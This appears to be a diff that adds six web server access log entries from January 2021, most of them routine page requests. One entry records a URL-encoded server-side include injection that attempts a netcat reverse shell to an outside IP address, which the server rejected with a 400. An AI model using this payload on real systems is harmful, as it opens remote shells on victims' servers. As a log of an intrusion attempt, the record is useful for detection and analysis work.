@@ -1,0 +1,6 @@
+ - - [19/Jan/2021:14:01:27 +1000] "GET / HTTP/1.0" 200 721 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"
+ - - [19/Jan/2021:14:40:41 +1000] "GET / HTTP/1.0" 200 721 "-" "Linux Gnu (cow)"
+ - - [19/Jan/2021:15:01:35 +1000] "GET / HTTP/1.0" 200 721 "-" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.13.1.0zlib/1.2.3 libidn/1.18 libssh2/1.2.2"
+ - - [19/Jan/2021:15:05:01 +1000] "GET / HTTP/1.0" 200 721 "-" "curl/7.58.0"
+ - - [19/Jan/2021:15:46:19 +1000] "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/p;nc%20-w%205%2089.248.170.31%209772%200%3C/tmp/p|/bin/sh%3E/tmp/p%202%3E/tmp/p;rm%20/tmp/p%22%20--%3e HTTP/1.0" 400 59563 "-" "-"
+ - - [19/Jan/2021:16:00:13 +1000] "GET / HTTP/1.0" 400 57581 "-" "-"
